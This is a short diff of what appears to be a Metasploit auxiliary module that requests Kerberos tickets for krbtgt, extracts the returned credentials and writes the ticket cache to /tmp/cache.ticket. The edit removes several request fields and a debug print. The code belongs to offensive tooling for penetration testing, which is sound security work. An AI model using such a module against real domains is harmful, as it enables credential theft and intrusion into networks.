@@ -109,12 +109,8 @@ class Metasploit4 < Msf::Auxiliary
       client_name: datastore['USER'],
       server_name: "krbtgt/#{datastore['DOMAIN']}",
       realm: datastore['DOMAIN'],
-      key: password_digest,
-      logon_time: logon_time,
       session_key: session_key,
       ticket: ticket,
-      group_ids: groups,
-      domain_id: datastore['DOMAIN_SID'],
       auth_data: auth_data,
       pa_data: pre_auth
     )
@@ -127,8 +123,6 @@ class Metasploit4 < Msf::Auxiliary
     print_good("#{peer} - Valid TGS-Response, extracting credentials...")
 
     cache = extract_kerb_creds(res, 'AAAABBBBCCCCDDDD')
-
-    pp cache
 
     f = File.new('/tmp/cache.ticket', 'wb')
     f.write(cache.encode)
